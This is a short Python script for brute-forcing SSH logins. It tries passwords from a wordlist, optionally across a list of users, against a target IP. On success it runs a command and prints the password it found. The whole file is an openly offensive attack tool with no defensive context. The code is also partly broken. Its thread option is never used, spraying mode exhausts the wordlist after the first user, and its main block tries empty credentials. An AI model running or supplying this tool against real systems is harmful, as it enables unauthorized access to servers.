#!./env/bin/python3
import socket
import os
import sys
import random
import string
import argparse
import keyboard
import paramiko

# init option parser
parser = argparse.ArgumentParser(description='SSH Bruteforce > use -ul if you want to use spraying mode')
parser.add_argument("-v", "--verbose", action='store_true', help='Verbose output')
parser.add_argument("-l", "--list", help='Wordlist for Attack', required=True)
parser.add_argument("-t", "--target", type=str, help='Target IP Adress', required=True)
parser.add_argument("-n", "--number", type=int, help='Number of threads', required=True)
parser.add_argument("-u", "--user", type=str, help='username for attack', required=True)
parser.add_argument("-ul", "--userlist", type=str, help='userlist for attack', required=False)
args = parser.parse_args()

def newTry(target,user,password):
    print("\nTrying: " + user + ":" + password)
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=user, password=password)
        _stdin, _stdout,_stderr = client.exec_command("ls")
        print(_stdout.read())
        client.close()
        return True
    except paramiko.AuthenticationException as e:
        print("[-] Wrong Password")
        print(e)
        return False

wordlist = open(args.list)
if args.userlist != None:
    userlist = open(args.userlist)
    for user in userlist:
        user = user.strip()
        for password in wordlist:
            password = password.strip()
            if newTry(args.target,user,password):
                print("[+] Password found: " + user + ":" + password)
                sys.exit(0)
else:
    for pw in wordlist.readlines():
        pw = pw.strip()
        if newTry(args.target,args.user,pw):
            print("[+] Password found: " + pw)
            sys.exit(0)

# start here
if __name__ == "__main__":
    for i in range(args.number):
        newTry(args.target,"","")
        if keyboard.is_pressed('q'):
            print("Aborted by user.")
            break